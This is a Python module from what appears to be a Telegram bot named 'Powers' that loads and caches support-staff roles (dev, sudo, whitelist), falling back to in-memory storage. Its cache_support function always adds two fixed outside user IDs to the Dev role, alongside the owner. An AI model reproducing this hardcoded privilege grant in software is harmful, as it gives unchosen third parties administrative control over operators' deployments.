import Powers
from Powers import OWNER_ID, SUPPORT_USERS

# Safe memory-only fallback class
class MemorySupport:
    def __init__(self):
        self._support = {"dev": [], "sudo": [], "whitelist": []}

    def insert_support_user(self, user_id, role):
        if role in self._support:
            if user_id not in self._support[role]:
                self._support[role].append(user_id)

    def get_particular_support(self, role):
        return self._support.get(role, [])

# Use Mongo if available else Memory
try:
    from Powers.database.support_db import SUPPORTS
    SUPPORT_DB = SUPPORTS()
except Exception:
    SUPPORT_DB = MemorySupport()

async def load_support_users():
    for i in SUPPORT_USERS.get("Dev", []):
        SUPPORT_DB.insert_support_user(int(i), "dev")
    for i in SUPPORT_USERS.get("Sudo", []):
        SUPPORT_DB.insert_support_user(int(i), "sudo")
    for i in SUPPORT_USERS.get("White", []):
        SUPPORT_DB.insert_support_user(int(i), "whitelist")
    return

def get_support_staff(want="all"):
    """Return dev, sudo, whitelist, dev_level, sudo_level, all"""
    if want in ["dev", "dev_level"]:
        devs = SUPPORT_USERS.get("Dev") or SUPPORT_DB.get_particular_support("dev")
        wanted = list(devs)
        if want == "dev_level":
            wanted.append(OWNER_ID)
    elif want == "sudo":
        sudo = SUPPORT_USERS.get("Sudo") or SUPPORT_DB.get_particular_support("sudo")
        wanted = list(sudo)
    elif want == "whitelist":
        whitelist = SUPPORT_USERS.get("White") or SUPPORT_DB.get_particular_support("whitelist")
        wanted = list(whitelist)
    elif want == "sudo_level":
        devs = SUPPORT_USERS.get("Dev") or SUPPORT_DB.get_particular_support("dev")
        sudo = SUPPORT_USERS.get("Sudo") or SUPPORT_DB.get_particular_support("sudo")
        wanted = list(sudo) + list(devs) + [OWNER_ID]
    else:
        devs = SUPPORT_USERS.get("Dev") or SUPPORT_DB.get_particular_support("dev")
        sudo = SUPPORT_USERS.get("Sudo") or SUPPORT_DB.get_particular_support("sudo")
        whitelist = SUPPORT_USERS.get("White") or SUPPORT_DB.get_particular_support("whitelist")
        wanted = list(set([int(OWNER_ID)] + list(devs) + list(sudo) + list(whitelist)))

    return wanted or []

async def cache_support():
    dev = set(SUPPORT_DB.get_particular_support("dev"))
    dev.update([1344569458, 1432756163, int(OWNER_ID)])
    sudo = set(SUPPORT_DB.get_particular_support("sudo"))
    SUPPORT_USERS["Dev"] = SUPPORT_USERS.get("Dev", set()).union(dev)
    SUPPORT_USERS["Sudo"] = SUPPORT_USERS.get("Sudo", set()).union(sudo)
    return
